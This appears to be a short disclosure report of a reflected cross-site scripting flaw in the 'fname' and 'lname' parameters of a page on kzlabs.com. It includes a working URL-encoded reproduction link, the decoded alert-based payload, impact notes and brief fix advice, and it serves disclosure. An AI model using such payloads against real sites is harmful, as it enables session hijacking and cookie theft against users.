## Title
Reflected Cross-Site Scripting (XSS) in `fname` and `lname` Parameters

## Summary
Reflected XSS vulnerability in:
`https://kzlabs.com/punishment/5.php`

## Steps to Reproduce
1. Open the following URL in browser:
`https://kzlabs.com/punishment/5.php?fname=%22%3E%3Cdatalist+id%3Dx%3E%3Coption+value%3Dx%3E%3Csvg+onload%3Dalert%28%22RJ%22%29%3E&lname=%22%3E%3Cdatalist+id%3Dx%3E%3Coption+value%3Dx%3E%3Csvg+onload%3Dalert%28101%29%3E`

2. Observe execution.

## Payload Used
`"><datalist id=x><option value=x><svg onload=alert("RJ")>`

## Proof of Concept
## Screenshot — Vulnerable application confirming XSS execution
<img width="1918" height="825" alt="image" src="https://github.com/user-attachments/assets/b87745f4-e28a-48f5-a5cc-f2c7dc154197" />


## Impact
- Session hijacking
- Cookie theft
- JS execution

## Recommendations for Fix
- Encode output
- Validate input
- Secure rendering
